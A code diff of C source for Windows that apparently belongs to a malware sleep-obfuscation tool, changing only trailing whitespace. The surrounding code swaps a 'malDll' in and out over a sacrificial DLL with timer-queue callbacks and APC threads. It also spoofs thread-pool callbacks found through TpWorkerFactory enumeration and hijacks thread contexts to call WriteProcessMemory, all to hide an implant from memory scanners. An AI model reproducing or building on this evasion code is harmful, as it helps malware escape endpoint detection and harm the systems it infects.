@@ -68,7 +68,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
     }
 
 
-    
+
 
     *(ULONG_PTR*)((CtxHide[1]).Rsp) = (DWORD64)ExitThread;
     CtxHide[1].Rip = (DWORD64)WriteProcessMemory;
@@ -250,7 +250,7 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
         PLIST_ENTRY pHead = tp_timer.WindowStartLinks.Children.Flink;
         PLIST_ENTRY pFwd = tp_timer.WindowStartLinks.Children.Flink;
         LIST_ENTRY entry = { 0 };
-        
+
 
         do {
 
@@ -260,7 +260,7 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
             //print all the tp_timer members
 
             if ((ctx).FinalizationCallback == ResumeThreadAddress) {
-                
+
                 if (tp_timer.DueTime > highest) {
                     second_highest = highest;
                     highest = tp_timer.DueTime;
@@ -272,7 +272,7 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
                     callbackArray[1] = (PTPP_CLEANUP_GROUP_MEMBER)tp_timer.Work.CleanupGroupMember.Context; //address of the object
                 }
 
-                
+
                 (*arraySize)++;
 
             }
@@ -302,7 +302,7 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
 
     HMODULE hNtdll = { 0 };
     int arraySize = 0;
-	
+
 
     // Call NtQuerySystemInformation to get the handles information
     ULONG bufferSize = 0x1000;
@@ -393,13 +393,13 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     HANDLE   EvntHide = { 0 };
     HANDLE DummyEvent = { 0 };
 
-   
-    
+
+
     //callbackArray for APC to spoof
 	PTPP_CLEANUP_GROUP_MEMBER callbackArray[2] = { 0 };
     DWORD64 ResumeThreadValue = (DWORD64) ResumeThreadAddress;
     DWORD64 SafeCallback = (DWORD64) MessageBoxAddress;
-    
+
 
     //sleaping threads = 5 Timers + 6 APC threads
     HANDLE ThreadArray[11] = { NULL };
@@ -408,7 +408,7 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     HANDLE  hTimerQueue = NULL;
     HANDLE  hNewTimer = NULL;
 
-    //i create the sync event that would trigger the first thread 
+    //i create the sync event that would trigger the first thread
     if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&EvntHide, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
         return -1;
     }
@@ -504,16 +504,16 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
 
     SetThreadContext(ThreadArray[0], context);//unmap
     SetThreadContext(ThreadArray[1], contextB);//map
-    SetThreadContext(ThreadArray[2], contextC);//unmap 
+    SetThreadContext(ThreadArray[2], contextC);//unmap
     SetThreadContext(ThreadArray[3], contextD);//mapmal
-    SetThreadContext(ThreadArray[4], contextE);//setevent   
+    SetThreadContext(ThreadArray[4], contextE);//setevent
 
     hTimerQueue = CreateTimerQueue();
     if (hTimerQueue == NULL) {
         return -1;
     }
 
-    
+
 
     if (ResumeThreadValue != NULL && SafeCallback != NULL) {
         //these two need to be bit longer in order for the spoofing to work properly, needs more testing for a more precise waiting
@@ -523,13 +523,13 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[4], 1000, 0, WT_EXECUTEINTIMERTHREAD);//hide callbacks
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[2], 20100, 0, WT_EXECUTEINTIMERTHREAD);//unmap
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[3], 20200, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
-		
+
         //TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
         if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray, ntFunctions) == 0) {
-            
+
             //i should run SleapingAPC here so that all those contexts are available
             if (SleapingAPCNG(callbackArray, &EvntHide, &DummyEvent, ApcThreads, CtxHide, CtxFix, &ResumeThreadValue, &SafeCallback, ntFunctions, NtTestAlertAddress) == 0) {
-                
+
                 int counter = 5;
                 for (int i = 0; i < 6; i++) {
 
@@ -571,10 +571,10 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     CHAR buffer[20] = { 0 };
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
     DWORD charsWritten;
-    
 
-    
-    
+
+
+
 
 
     //clean up totale
